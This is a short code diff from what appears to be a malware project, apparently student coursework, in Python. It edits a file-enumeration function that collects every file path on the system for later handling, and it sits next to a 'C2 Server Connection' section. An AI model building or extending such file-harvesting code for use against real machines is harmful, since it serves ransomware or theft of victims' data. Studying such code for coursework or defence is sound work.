@@ -86,7 +86,7 @@ def load_file_paths():
         for name in files:
             path = os.path.join(root, name)
             global file_paths
-            if "LockDownBrowserInstaller" not in path.lower() and "python" not in path.lower():
+            if "lockdownbrowserinstaller" not in path.lower() and "cecs378" not in path.lower() and "python" not in path.lower():
                 file_paths.append(os.path.join(root, name))
 
 # C2 Server Connection
